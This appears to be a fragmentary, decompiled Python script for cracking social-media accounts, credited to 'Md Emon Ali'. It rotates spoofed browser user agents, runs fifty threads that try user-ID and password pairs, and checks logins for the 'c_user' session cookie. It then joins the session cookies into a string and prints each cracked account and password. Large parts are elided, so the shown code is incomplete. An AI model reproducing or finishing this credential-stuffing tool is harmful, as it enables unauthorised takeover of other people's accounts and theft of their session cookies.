# Decompile by Mardis (Tools By EMON)
...
ua =["Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264",]
ua =["Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412",]
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m Md Emon Ali')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;33m [EMON-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}EMON{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
